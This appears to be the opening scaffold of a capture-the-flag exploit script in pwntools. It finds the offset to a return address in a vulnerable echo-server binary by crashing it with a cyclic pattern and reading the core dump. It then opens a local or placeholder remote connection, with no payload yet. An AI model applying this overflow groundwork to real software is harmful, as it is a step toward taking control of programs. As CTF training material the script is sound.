#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

NUM_CYCLIC_BYTES = 256

context.binary = exe

def find_offset_to_return_address():
    '''This function will generate a cyclic pattern and send it as input to the program. It will get examine the return address of the function `do_stuff` and find where in the cyclic pattern those bytes exist. Returns the number of bytes needed to overwrite the return address.

    https://docs.pwntools.com/en/stable/elf/corefile.html
    '''
    # Generate a cyclic pattern so that we can auto-find the offset.
    payload = cyclic(NUM_CYCLIC_BYTES)

    # Run the process once so that it crashes.
    proc = process([exe.path])

    # Send the payload.
    proc.sendlineafter('WeLcOmE To mY EcHo sErVeR!', payload)
    proc.wait()

    # Get the core dump.
    core = proc.corefile

    # The faulting address should be some subset of bytes inside our cyclic pattern.
    # `pwn.pack` will convert the hexadecimal bytes of the address to a string, which is the data structure used for our cyclic pattern.
    assert pack(core.fault_addr) in payload, "Faulting address not in the cyclic pattern."

    # Find our offset.
    offset = cyclic_find(pack(core.fault_addr))

    return offset

def conn():
    if args.REMOTE:
        r = remote("addr", 1337)

    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)

    return r


def main():
    r = conn()

    offset = find_offset_to_return_address()
    print(f"[+] The offset to the faulting address is: {offset}")

    r.interactive()


if __name__ == "__main__":
    main()
